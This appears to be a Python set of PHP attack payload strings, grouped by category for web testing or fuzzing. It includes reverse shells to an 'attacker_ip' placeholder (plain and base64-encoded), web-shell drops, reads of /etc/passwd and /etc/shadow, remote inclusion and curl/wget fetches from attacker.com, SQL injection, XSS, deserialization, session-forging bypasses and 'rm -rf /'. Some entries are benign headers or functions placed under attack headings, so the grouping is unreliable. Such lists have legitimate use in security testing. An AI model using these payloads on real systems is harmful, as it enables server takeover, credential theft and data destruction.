phppayload = {
    # Basic execution and system commands
    "phpinfo();",
    "system('id');",
    "exec('ls');",
    "passthru('whoami');",
    "shell_exec('pwd');",
    "popen('ls -al', 'r');",
    "proc_open('whoami', [], $pipes);",
    "eval('system(\"id\");');",
    "assert('system(\"ls -la\");');",
    "print_r(scandir('/'));",
    "print(shell_exec('uname -a'));",
    "echo file_get_contents('/etc/passwd');",
    "fpassthru(fopen('/etc/passwd', 'r'));",
    "file_put_contents('/tmp/shell.php', '<?php echo shell_exec($_GET[\"cmd\"]); ?>');",
    "highlight_file('/etc/passwd');",
    
    # File handling and uploads
    "move_uploaded_file($_FILES['file']['tmp_name'], '/tmp/uploads/file');",
    "fopen('/etc/shadow', 'r');",
    "unlink('/var/www/html/somefile');",
    "rename('/tmp/file', '/var/www/html/file');",
    "chmod('/var/www/html/file', 0777);",
    "chown('/var/www/html/file', 'www-data');",
    "copy('/etc/passwd', '/var/www/html/passwd_copy');",
    "is_readable('/var/www/html/config.php');",
    "is_writable('/var/www/html/config.php');",
    "file_exists('/tmp/testfile');",
    
    # Command injection and reverse shell
    "exec('/bin/bash -c \"bash -i >& /dev/tcp/attacker_ip/4444 0>&1\"');",
    "system('/bin/bash -c \"bash -i >& /dev/tcp/attacker_ip/4444 0>&1\"');",
    "exec('/bin/sh -i > /dev/tcp/attacker_ip/1234 0<&1 2>&1');",
    "system('nc -e /bin/bash attacker_ip 4444');",
    "shell_exec('perl -e \"use Socket;\"');",
    "shell_exec('php -r \"$sock=fsockopen(\\\"attacker_ip\\\",4444);\"');",
    "proc_open('/bin/bash', $descriptorspec, $pipes);",
    "popen('/bin/bash', 'r');",
    "eval(base64_decode('YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlcl9pcC80NDQ0IDA+JjEn'));",
    
    # SQL Injection-like payloads
    "$_GET['id'] = 1 OR 1=1;",
    "$_POST['id'] = 1; DROP TABLE users;",
    "$sql = 'SELECT * FROM users WHERE id = \"' . $_GET['id'] . '\"';",
    "$db->query('SELECT * FROM users WHERE id = ' . $_POST['id']);",
    "mysqli_query($conn, 'DROP TABLE users;');",
    "mysql_query('SELECT * FROM users WHERE id = \"' . $_POST['id'] . '\"');",
    "pg_query('SELECT * FROM users WHERE id = ' . $_GET['id']);",
    "sqlsrv_query($conn, 'DELETE FROM users WHERE id=1;');",
    
    # Directory traversal and file inclusion
    "include('/var/www/html/config.php');",
    "require('/var/www/html/config.php');",
    "include_once('/var/www/html/init.php');",
    "require_once('/var/www/html/init.php');",
    "include($_GET['file']);",
    "require($_POST['file']);",
    "file_get_contents('../../../../../etc/passwd');",
    "fopen('../../../../../var/www/html/index.php', 'r');",
    "scandir('/var/www/html/uploads/');",
    "include($_SERVER['DOCUMENT_ROOT'].'/file.php');",
    
    # HTTP header injections
    "header('Location: http://attacker.com');",
    "header('Set-Cookie: admin=true; path=/;');",
    "header('Content-Type: text/html; charset=UTF-8');",
    "header('Content-Disposition: attachment; filename=\"file.txt\"');",
    "header('HTTP/1.1 301 Moved Permanently');",
    "header('X-XSS-Protection: 0');",
    "header('X-Frame-Options: DENY');",
    "header('X-Content-Type-Options: nosniff');",
    
    # XSS via PHP
    "echo '<script>alert(1)</script>';",
    "echo '<img src=\"x\" onerror=\"alert(1)\">';",
    "echo '<iframe src=\"javascript:alert(1)\"></iframe>';",
    "echo '<input onfocus=alert(1) autofocus>';",
    "echo '<svg/onload=alert(1)>';",
    "echo '<div style=\"background-image:url(javascript:alert(1))\"></div>';",
    "echo '<body onload=alert(1)>';",
    "echo '<object data=\"javascript:alert(1)\"></object>';",
    
    # Code execution and eval injection
    "eval($_GET['cmd']);",
    "assert($_POST['cmd']);",
    "eval('$_GET[\"cmd\"]');",
    "assert('system(\"ls\");');",
    "create_function('', 'echo shell_exec(\"ls\");');",
    "eval(base64_decode($_GET['cmd']));",
    "assert(base64_decode($_POST['cmd']));",
    "assert('print_r(scandir(\".\"));');",
    
    # Remote file inclusion
    "include('http://attacker.com/shell.php');",
    "include('http://attacker.com/file.php');",
    "include($_GET['file']);",
    "require('http://attacker.com/config.php');",
    "include_once('http://attacker.com/shell.php');",
    "require_once('http://attacker.com/file.php');",
    
    # Command execution via PHP functions
    "exec('wget http://attacker.com/shell.sh');",
    "system('curl http://attacker.com/malware.sh');",
    "shell_exec('nc attacker_ip 4444 -e /bin/sh');",
    "proc_open('python -c \"import socket\"', $descriptorspec, $pipes);",
    "popen('python3 -c \"import os; os.system(\'whoami\')\"', 'r');",
    "passthru('curl http://attacker.com/script.sh');",
    
    # Deserialization attacks
    "unserialize($_GET['data']);",
    "unserialize(base64_decode($_POST['data']));",
    "unserialize(file_get_contents('php://input'));",
    "eval(unserialize($_POST['data']));",
    "eval(gzuncompress($_GET['data']));",
    "eval(unserialize(base64_decode($_POST['data'])));",
    "unserialize($_COOKIE['PHPSESSID']);",
    
    # Miscellaneous payloads
    "preg_replace('/.*/e', 'system(\"id\")', 'dummy');",
    "phpinfo(); var_dump($GLOBALS);",
    "$_SERVER['REMOTE_ADDR'] = 'attacker_ip';",
    "$_SERVER['HTTP_USER_AGENT'] = '<?php system(\"id\"); ?>';",
    "setcookie('PHPSESSID', '<?php system(\"ls\"); ?>');",
    "$_COOKIE['PHPSESSID'] = 'attacker_cookie';",
    "mail('attacker@example.com', 'Subject', 'Body');",
    "$_GET['cmd'] = 'rm -rf /'; eval($_GET['cmd']);",
    "json_encode($_POST);",
    "preg_match('/(.*)/e', 'system(\"ls\")', 'test');",
    
    # Authentication bypasses
    "$_SESSION['user'] = 'admin';",
    "$_SESSION['is_admin'] = true;",
    "$_SESSION['role'] = 'superadmin';",
    "session_start(); $_SESSION['authenticated'] = true;",
    "setcookie('authenticated', 'true');",
    "$_COOKIE['auth'] = 'admin';",
    "session_regenerate_id(true);",
    "$_SESSION['username'] = 'admin';",
    "session_destroy();",
    "$_SESSION = array();"
}
